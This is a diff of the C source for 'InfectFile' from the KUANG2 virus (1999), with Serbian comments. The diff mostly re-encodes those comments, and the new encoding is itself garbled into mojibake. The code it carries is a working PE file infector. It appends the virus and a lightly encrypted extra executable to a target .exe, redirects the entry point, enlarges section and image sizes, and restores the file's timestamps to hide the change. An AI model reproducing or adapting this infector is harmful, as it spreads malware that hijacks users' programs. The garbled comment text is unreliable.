@@ -1,13 +1,13 @@
 /***[ThuNderSoft]*************************************************************
 							   KUANG2: InfectFile
 								   ver: 0.19
-								˙˘ƒÕ WEIRD Õƒ˘˙
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
 // ver 0.19 (26-may-1999): test mod
 // ver 0.18 (19-may-1999): overlay, bss sekcije
-// ver 0.16 (18-may-1999): bug kod ITrva2ofs, viÑe istih DLLova
+// ver 0.16 (18-may-1999): bug kod ITrva2ofs, vi≈°e istih DLLova
 // ver 0.14 (15-may-1999): HNA i IAT
 // ver 0.10 (14-may-1999): born code
 
@@ -15,11 +15,11 @@
 #include <ctypew.h>
 #include <win95e.h>
 
-// kada je definisan I_TESTMODE onda beleÇi sve informacije
+// kada je definisan I_TESTMODE onda bele≈æi sve informacije
 // prilikom inficiranja fajla
 //#define I_TESTMODE
 
-// kada je definisan I_TESTMODE_API onda zapiÑi i sve import funkcije!
+// kada je definisan I_TESTMODE_API onda zapi≈°i i sve import funkcije!
 //#define I_TESTMODE_API
 
 
@@ -35,7 +35,7 @@ char _testb[16];
 #define		IMAGE_DOS_SIGNATURE1	0x5A4D		// MZ
 #define		IMAGE_DOS_SIGNATURE2	0x4D5A		// ZM
 
-// orijentaciona veÜa vrednost veliÅine virusa (za potrebe mapiranja fajla)
+// orijentaciona veƒáa vrednost veliƒçine virusa (za potrebe mapiranja fajla)
 #define		VIRUSLEN	12500
 
 // ime .exe fajla koji se dodaje na host PE exe
@@ -55,23 +55,23 @@ extern char kript;
 /*
 	InfectFile
 	----------
-  ˛ Inficira neki PE EXE fajl, koji je dat kao argument.
-  ˛ Ne proverava se extenzija, ni da li je fajl veÜ zaraÇen.
-  ˛ öuvaju se atributi i vreme upisa.
-  ˛ VraÜa 0 ako je sve u redu. */
+  + Inficira neki PE EXE fajl, koji je dat kao argument.
+  + Ne proverava se extenzija, ni da li je fajl ve≈æ zara≈æen.
+  + ƒçuvaju se atributi i vreme upisa.
+  + Vraƒáa 0 ako je sve u redu. */
 
 int InfectFile(char *fname)
 {
 	HANDLE hfile, hfilemap, haddfile;
-	unsigned int fsize;				// veliÅina fajla
+	unsigned int fsize;				// veliƒçina fajla
 	char *filemap;					// pointer na MMF
-	char *filestart;				// uvek pointer na poÅetak MMF
+	char *filestart;				// uvek pointer na poƒçetak MMF
 	unsigned int retvalue;			// povratna vrednost iz ove f-je
 	unsigned int fattr;				// atributi fajla
 	unsigned int NumberOfSections;	// broj sekcija PE fajla
-	unsigned int *EntryPointRVA;	// pointer na mesto u fajlu gde se Åuva EntryPoint RVA
+	unsigned int *EntryPointRVA;	// pointer na mesto u fajlu gde se ƒçuva EntryPoint RVA
 	unsigned int ImageBase;			// Image base adresa
-	unsigned int SectionAlign;		// alignment veliÅine svake sekcije
+	unsigned int SectionAlign;		// alignment veliƒçine svake sekcije
 	unsigned int *SizeofImage;		// pointer na SizeOfImage
 	PIMAGE_DATA_DIRECTORY entry_idd;// pointer na prvi Data directorys
 	char *ImportTable;				// Import Table
@@ -79,16 +79,16 @@ int InfectFile(char *fname)
 	unsigned int *IAT, *HNA;		// Import Address Table & Hint Name Address
 	unsigned int *UseT;				// ili IAT ili HNA
 	char *module_name;				// ime IMPORT modula
-	char *virusstart;				// file offset gde Üe poÅeti virus
+	char *virusstart;				// file offset gde ‚Ä†e poƒçeti virus
 	char kernel32[]="KERNEL32.DLL"; // kernel32.dll
 	char getmodulehandle[]="GetModuleHandleA";  // imena f-ja
-	char getprocaddress[]="GetProcAddress";     // koje traÇimo
-	unsigned int GetModuleHandleRVA;			// RVA adresa gde Üe virus...
-	unsigned int GetProcAddressRVA;				// ...naÜi ove funkcije
-	unsigned int i;								// pomoÜne promenljive
-	unsigned int raw_virussize;					// veliÅina samo virus koda (bez add exe)
-	unsigned int align_virussize;				// align veliÅina virus
-	unsigned int overlay;						// veliÅina overlaya ako je ima
+	char getprocaddress[]="GetProcAddress";     // koje tra≈æimo
+	unsigned int GetModuleHandleRVA;			// RVA adresa gde ƒáe virus...
+	unsigned int GetProcAddressRVA;				// ...na≈æi ove funkcije
+	unsigned int i;								// pomoƒáne promenljive
+	unsigned int raw_virussize;					// veliƒçina samo virus koda (bez add exe)
+	unsigned int align_virussize;				// align veliƒçina virus
+	unsigned int overlay;						// veliƒçina overlaya ako je ima
 	FILETIME creation_time, lastacc_time, lastwr_time;
 #define		function_name		module_name
 
@@ -101,7 +101,7 @@ int InfectFile(char *fname)
 
 
 
-/*** POöETAK & PRIPREMA FAJLOVA ***/
+/*** POƒåETAK & PRIPREMA FAJLOVA ***/
 
 	// uzmi atribute fajla i ako je setovan read-only onda ga resetuj
 	fattr=GetFileAttributes(fname);			// uzmi atribute fajla
@@ -116,13 +116,13 @@ int InfectFile(char *fname)
 	WriteFile(testIfile, "\r\nopen", 6, &Iwritten, NULL);
 #endif
 
-	// uzmi veliÅinu fajla
+	// uzmi veliƒçinu fajla
 	fsize=GetFileSize(hfile, NULL);
 	if (fsize>0xFFFFFFFF-VIRUSLEN) {retvalue=0x11; goto end2;}	// ako je fajl prevelik
-	if (fsize<256) {retvalue=0x11; goto end2;}					// ako je fajl suviÑe mali
-	oldfilesize=fsize;						// zapamti i originalnu veliÅinu fajla
+	if (fsize<256) {retvalue=0x11; goto end2;}					// ako je fajl suvi≈°e mali
+	oldfilesize=fsize;						// zapamti i originalnu veliƒçinu fajla
 
-	// saÅuvaj original vreme fajla
+	// saƒçuvaj original vreme fajla
 	GetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);
 
 	// kreiraj MMF
@@ -140,7 +140,7 @@ int InfectFile(char *fname)
 	// proveri da li je fajl DOS .EXE
 	if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE1)			// e_magic == MZ ?
 		if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE2)		// e_magic == ZM ?
-			{retvalue=0x101; goto end4;}								// nije, izaîi
+			{retvalue=0x101; goto end4;}								// nije, izaƒëi
 
 	// pomeri se na adresu PE exe header-a
 	filemap += ((PIMAGE_DOS_HEADER)filemap)->e_lfanew;
@@ -150,7 +150,7 @@ int InfectFile(char *fname)
 	if (*(DWORD *)filemap != IMAGE_NT_SIGNATURE)	// 'PE00'
 		{retvalue=0x102; goto end4;}
 
-	// preskoÅi signature i sada smo na poÅetku PE headera
+	// preskoƒçi signature i sada smo na poƒçetku PE headera
 	filemap += sizeof(DWORD);
 
 #ifdef I_TESTMODE
@@ -166,7 +166,7 @@ int InfectFile(char *fname)
 	// preuzmi broj sekcija
 	NumberOfSections = ((PIMAGE_FILE_HEADER)filemap)->NumberOfSections;
 
-	// preskoÅi PE header i sada pokazujemo na PE Optional header
+	// preskoƒçi PE header i sada pokazujemo na PE Optional header
 	filemap += IMAGE_SIZEOF_FILE_HEADER;
 
 	// proveri da li je exe fajl za GUI (nije konzolna aplikacija)
@@ -187,12 +187,12 @@ int InfectFile(char *fname)
 	i=(unsigned int)filemap + 96;				// 96 je ofset do DirectoryData
 	entry_idd = (PIMAGE_DATA_DIRECTORY) i;
 
-	// vidi da li postoji IMPORT sekcija - ako ne postoji onda veliÅina==0
+	// vidi da li postoji IMPORT sekcija - ako ne postoji onda veliƒçina==0
 	if (!(entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).Size)
 		{retvalue=0x105; goto end4;}
 
-	// preskoÅi i PE Optional header, sada smo na poÅetku Section Table
-	// ova tabla sadrÇi Section Header-e kojih ima NumberOfSections
+	// preskoƒçi i PE Optional header, sada smo na poƒçetku Section Table
+	// ova tabla sadr≈æi Section Header-e kojih ima NumberOfSections
 	filemap += sizeof(IMAGE_OPTIONAL_HEADER);
 
 #ifdef I_TESTMODE
@@ -203,12 +203,12 @@ int InfectFile(char *fname)
 
 
 
-/*** NALAêENJE IMPORT SEKCIJE ***/
+/*** NALA≈ΩENJE IMPORT SEKCIJE ***/
 
 	i=0; ImportTable=NULL;
 
-	// pretraÇi celu Section Table da bi naÑli Import sekciju (sadrÇi IT)
-	// takoîe treba locirati poslednji Section Header
+	// pretra≈æi celu Section Table da bi na≈°li Import sekciju (sadr≈æi IT)
+	// takoƒëe treba locirati poslednji Section Header
 	while (i<NumberOfSections) {
 
 #ifdef I_TESTMODE
@@ -221,22 +221,22 @@ int InfectFile(char *fname)
 		// Da li je trenutna sekcija IMPORT sekcija?
 		// proverava se da li je VirtualAddress iz DirectoryData[IMPORT]
 		// unutar RVA granica trenutne sekcije: [VirtualAddress, VirtualAddress+SizeOfRawData).
-		if (!ImportTable)	// ako IMPORT sekcija joÑ uvek nije naîena
+		if (!ImportTable)	// ako IMPORT sekcija jo≈° uvek nije naƒëena
 		if ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData) {
-			// pomoÜna promenljiva, treba kasnije
+			// pomoƒána promenljiva, treba kasnije
 			ISrva2ofs = (unsigned int) filestart + ((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress;
-			// Naîena je IMPORT sekcij!, preuzi file offset na njen poÅetak
+			// Naƒëena je IMPORT sekcij!, preuzmi file offset na njen poƒçetak
 			ImportTable = (char *) ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress + ISrva2ofs);
-			// iako je import sekcija pronaîena, vrti dalje da bi naÑao
+			// iako je import sekcija pronaƒëena, vrti dalje da bi na≈°ao
 			// poslednju sekciju
 		}
 
-		// idi na sledeÜu sekciju
+		// idi na sledeƒáu sekciju
 		filemap+=IMAGE_SIZEOF_SECTION_HEADER;		// sizeof(IMAGE_SECTION_HEADER);
 		i++;
 	}
 
-	// greÑka - nijedna sekcija nije IMPORT
+	// gre≈°ka - nijedna sekcija nije IMPORT
 	if (!ImportTable) {retvalue=0x106; goto end4;}
 
 
@@ -244,7 +244,7 @@ int InfectFile(char *fname)
 
 
 
-/*** NALAêENJE SVIH KERNEL32.DLL ***/
+/*** NALA≈ΩENJE SVIH KERNEL32.DLL ***/
 
 	// resetuje pointere
 	GetModuleHandleRVA=GetProcAddressRVA=0;
@@ -254,13 +254,13 @@ int InfectFile(char *fname)
 		// preuzmi ime DLLa
 		i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Name;
 		if (i) module_name = (char *) (ISrva2ofs + i);
-			else break;			// kraj, nema viÑe DLLova
+			else break;			// kraj, nema vi≈°e DLLova
 
 		// poredi ime DLLa sa 'KERNEL32.DLL'
 		if (!lstrcmpi(module_name, kernel32)) {
 
 
-			/*** NAéAO KERNEL32.DLL - NALAêENJE WinAPI FUNKCIJA ***/
+			/*** NA≈ΩAO KERNEL32.DLL - NALA≈ΩENJE WinAPI FUNKCIJA ***/
 
 			// preuzmi file ofset na IAT
 			i=ISrva2ofs + (unsigned int)((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->FirstThunk;
@@ -272,12 +272,12 @@ int InfectFile(char *fname)
 				HNA=(unsigned int*) (i);
 			} else HNA=0;
 
-			UseT=IAT;				// pretraÇuje se IAT
+			UseT=IAT;				// pretra≈æuje se IAT
 			if (HNA)				// ako postoji HNA (nije Borland)
-				if (*HNA != *IAT)	// ako razliÅito pokazuju IAT i HNA
-					UseT=HNA;		// onda je IAT optimizovan (Micro$oft), pa se pretraÇuje HNA
+				if (*HNA != *IAT)	// ako razliƒçito pokazuju IAT i HNA
+					UseT=HNA;		// onda je IAT optimizovan (Micro$oft), pa se pretra≈æuje HNA
 
-			// pretraÇi IAT ili HNA za potrebnim funkcijama
+			// pretraƒëi IAT ili HNA za potrebnim funkcijama
 			while (*UseT) {
 				// postoji samo ordinal, idi dalje
 				if ((signed int)(*UseT) < 0) {
@@ -293,38 +293,38 @@ int InfectFile(char *fname)
 				WriteFile(testIfile, function_name, lstrlen(function_name), &Iwritten, NULL);
 #endif
 
-				// poredi ime IMPORT f-je sa 'GetModuleHandleA', ako nije naîena
+				// poredi ime IMPORT f-je sa 'GetModuleHandleA', ako nije naƒëena
 				if (!GetModuleHandleRVA)
 				if (!lstrcmpi(function_name, getmodulehandle)) {
-					// naÑao, saÅuvaj RVA na IAT [GetModuleHandleA]
+					// na≈°ao, saƒçuvaj RVA na IAT [GetModuleHandleA]
 					GetModuleHandleRVA = (unsigned int) IAT - ISrva2ofs;
-					if (GetProcAddressRVA) break;	// ako su naîene obe f-je, izaîi
+					if (GetProcAddressRVA) break;	// ako su naƒëene obe f-je, izaƒëi
 				}
 
-				// poredi ime IMPORT f-je sa 'GetProcAddress', ako nije naîena
+				// poredi ime IMPORT f-je sa 'GetProcAddress', ako nije naƒëena
 				if (!GetProcAddress)
 				if (!lstrcmpi(function_name, getprocaddress)) {
-					// naÑao, saÅuvaj RVA na IAT [GetProcAddress]
+					// na≈°ao, saƒçuvaj RVA na IAT [GetProcAddress]
 					GetProcAddressRVA = (unsigned int) IAT - ISrva2ofs;
-					if (GetModuleHandleRVA) break;	// ako su naîene obe f-je, izaîi
+					if (GetModuleHandleRVA) break;	// ako su naƒëene obe f-je, izaƒëi
 				}
 
-				// idi na sledeÜu IMPORT funkciju
+				// idi na sledeƒëu IMPORT funkciju
 				UseT++; IAT ++;
-			}	// while, zavrÑena pretraga IAT
+			}	// while, zavr≈°ena pretraga IAT
 
-			// ako su naîene obe funkcije izaîi!
+			// ako su naƒëene obe funkcije izaƒëi!
 			if (GetModuleHandleRVA && GetProcAddressRVA) break;
 		}
 
-		// idi na sledeÜu IMPORT biblioteku
+		// idi na sledeƒáu IMPORT biblioteku
 		ImportTable += sizeof (IMAGE_IMPORT_DESCRIPTOR);
 	};
 
-	if (!GetModuleHandleRVA)			// nije naÑao prvu f-ju
+	if (!GetModuleHandleRVA)			// nije na≈°ao prvu f-ju
 		{retvalue=0x108; goto end4;}
-//	if (!GetProcAddressRVA)				// nije naÑao drugu f-ju
-//		{retvalue=0x109; goto end4;}	// ali, ko zna, moÇda je izvuÅemo iz KERNEL32.DLL
+//	if (!GetProcAddressRVA)				// nije na≈°ao drugu f-ju
+//		{retvalue=0x109; goto end4;}	// ali, ko zna, mo≈æda je izvuƒçemo iz KERNEL32.DLL
 
 #ifdef I_TESTMODE
 	WriteFile(testIfile, "\r\nattach", 8, &Iwritten, NULL);
@@ -341,15 +341,15 @@ int InfectFile(char *fname)
 #define		temp		ISrva2ofs
 #define		j			NumberOfSections
 
-	// otvori addexe fajl koji Üe se upisati
+	// otvori addexe fajl koji ƒáe se upisati
 	haddfile=CreateFile(addfile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
 	if (haddfile==INVALID_HANDLE_VALUE) {retvalue=0x10A; goto end4;}
-	// uzmi njegovu veliÅinu i ujedno je zapamti
+	// uzmi njegovu veliƒçinu i ujedno je zapamti
 	addfile_size=GetFileSize(haddfile, NULL);
 
 	// vrati da filemap pokazuje na poslednju sekciju
-	// paÇnja! postoje sekcije koje nisu fiziÅki prisutne u pe exe fajlu (.bss)
-	// one se razlikuju samo po tome Ñto je njihov PointerToRawData==0
+	// pa≈ænja! postoje sekcije koje nisu fiziƒçki prisutne u pe exe fajlu (.bss)
+	// one se razlikuju samo po tome ≈°to je njihov PointerToRawData==0
 	// ili je SizeOfRawData==0
 	do {
 		filemap -= IMAGE_SIZEOF_SECTION_HEADER;
@@ -357,53 +357,53 @@ int InfectFile(char *fname)
 		i=((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData;
 	} while ( !temp || !i );
 
-	// naîi file ofset gde treba dodati virus. Na Çalost, VirtualSize moÇe
-	// biti 0 (watcom linker) tako da se on ne moÇe koristiti.
+	// naƒëi file ofset gde treba dodati virus. Na≈æalost, VirtualSize mo≈æe
+	// biti 0 (watcom linker) tako da se on ne mo≈æe koristiti.
 	i+=temp;
 	if (fsize>i) overlay=fsize-i; else overlay=0;
-	virusstart = filestart + i + overlay;			// ako ima overlay, onda ga preskoÅi
+	virusstart = filestart + i + overlay;			// ako ima overlay, onda ga preskoƒçi
 
-	// odredi RAW veliÅinu koda virusa
+	// odredi RAW veliƒçinu koda virusa
 	raw_virussize=&virus_end-&virus_start;
-	// odredi i Align veliÅinu koda virusa + add file
+	// odredi i Align veliƒçinu koda virusa + add file
 	align_virussize=(((raw_virussize+addfile_size+overlay)/SectionAlign) + 1) * SectionAlign;
-	// preuzmi pointer na poÅetak koda virusa
+	// preuzmi pointer na poƒçetak koda virusa
 	viruscode=&virus_start;
 
-	// zapiÑi u virus RVA+ImageBase naÑe dve winAPI f-je
+	// zapi≈°i u virus RVA+ImageBase na≈°e dve winAPI f-je
 	ddGetModuleHandleA = GetModuleHandleRVA + ImageBase;
 	ddGetProcAddress = GetProcAddressRVA;
 	if (GetProcAddressRVA) ddGetProcAddress += ImageBase;
 
-	// Promeni RVA entry pointa na RVA poÅetka virusa
-	oldEntryPoint=*EntryPointRVA + ImageBase;		// saÅuvaj u fajlu stari entry point (RVA + ImageBase)
-	oldEntryPointRVA=*EntryPointRVA;				// saÅuvaj u fajlu samo RVA starog entry pointa
+	// Promeni RVA entry pointa na RVA poƒçetka virusa
+	oldEntryPoint=*EntryPointRVA + ImageBase;		// saƒçuvaj u fajlu stari entry point (RVA + ImageBase)
+	oldEntryPointRVA=*EntryPointRVA;				// saƒçuvaj u fajlu samo RVA starog entry pointa
 	j=((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress + temp + overlay;
-	oldEPoffs=(unsigned int) EntryPointRVA - (unsigned int) filestart;	// saÅuvaj i pointer na mesto entry pointa
+	oldEPoffs=(unsigned int) EntryPointRVA - (unsigned int) filestart;	// saƒçuvaj i pointer na mesto entry pointa
 	*EntryPointRVA=j;								// setuj RVA novog Entry Pointa
 
-	// Promeni veliÅinu poslednje sekcije i celog fajla
+	// Promeni veliƒçinu poslednje sekcije i celog fajla
 	oldoffs1=filemap-filestart+16;								// zapamti fajl ofset i
 	olddata1=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;	// stare podatke na tom mestu
 	((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData += align_virussize;
 	fsize += align_virussize - overlay;
 
-	// Promeni veliÅinu poslednje sekcije (VirtualSize) ako <> 0
+	// Promeni veliƒçinu poslednje sekcije (VirtualSize) ako <> 0
 	oldoffs4=filemap-filestart+8;									// zapamti fajl offset i
 	olddata4=((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize;	// stare podatke na tom mestu
-	if (olddata4)													// setuj novu veliÅinu ako je ona <> 0
+	if (olddata4)													// setuj novu veliƒçinu ako je ona <> 0
 		((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize = ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;
 
-	// Promeni veliÅinu sekcije (opet), ako ona postoji u DirectoryData.
+	// Promeni veliƒçinu sekcije (opet), ako ona postoji u DirectoryData.
 	// prvo se mora ustanoviti koja je sekcija u pitanju: koje sekcije RVA
 	// spada ovde (kao malo pre)
 	oldoffs2=i=0;
 	while (i<IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
 		if ((entry_idd[i]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < temp) {
-			// naÑao sekciju, zapamti stare vrednosti
+			// na≈°ao sekciju, zapamti stare vrednosti
 			oldoffs2=(unsigned int) &(entry_idd[i].Size) - (unsigned int) filestart;
 			olddata2=(entry_idd[i]).Size;
-			// promeni i njoj veliÅinu
+			// promeni i njoj veliƒçinu
 			(entry_idd[i]).Size += align_virussize;
 			break;
 		}
@@ -420,7 +420,7 @@ int InfectFile(char *fname)
 	olddata5=*SizeofImage;
 	*SizeofImage+=align_virussize;
 
-	kript=(char) GetTickCount();	// zapamti i sluÅajan broj koji sluÇi za dekriptovanje
+	kript=(char) GetTickCount();	// zapamti i sluƒçajan broj koji slu≈æi za dekriptovanje
 
 #ifdef I_TESTMODE
 	WriteFile(testIfile, "\r\nwrite", 7, &Iwritten, NULL);
@@ -432,12 +432,12 @@ int InfectFile(char *fname)
 
 /*** UPISIVANJE U FAJL ***/
 
-	// UpiÑi virus u fajl
+	// Upi≈°i virus u fajl
 	for (j=0; j<raw_virussize; j++) virusstart[j]=viruscode[j];
-	// UpiÑi i exe odmah posle
+	// Upi≈°i i exe odmah posle
 	virusstart=&virusstart[raw_virussize];
 	ReadFile(haddfile, virusstart, addfile_size, (LPDWORD) &i, NULL);
-	// Kriptuj fajl jednostavno i uvek sluÅajno
+	// Kriptuj fajl jednostavno i uvek sluƒçajno
 	for (j=0; j<addfile_size; j++, kript+=173) virusstart[j]-=kript;
 	// zatvori add exe fajl
 	CloseHandle(haddfile);
@@ -449,15 +449,15 @@ int InfectFile(char *fname)
 /*** REGULARAN KRAJ ***/
 
 	retvalue=0;
-	FlushViewOfFile(filestart,0);	// upiÑi sve promene nazad u fajl
+	FlushViewOfFile(filestart,0);	// upi≈°i sve promene nazad u fajl
 end4:
 	UnmapViewOfFile(filestart);		// zatvari MMF view
 end3:
 	CloseHandle(hfilemap);			// zatvori MMF
-	// bez obzira da li je fajl uspeÑno inficiran ili ne treba setovati
-	// njegovu veliÅinu, jer ako je nastala greÑka veliÅina fajla Üe
-	// se poveÜati, a virus neÜe biti dodat!
-	// namesti regularnu veliÅinu fajla
+	// bez obzira da li je fajl uspe≈°no inficiran ili ne treba setovati
+	// njegovu veliƒçinu, jer ako je nastala gre≈°ka veliƒçina fajla ƒáe
+	// se pove≈æati, a virus neƒáe biti dodat!
+	// namesti regularnu veliƒçinu fajla
 	SetFilePointer(hfile, fsize, NULL, FILE_BEGIN);
 	SetEndOfFile(hfile);
 	// vrati staro vreme
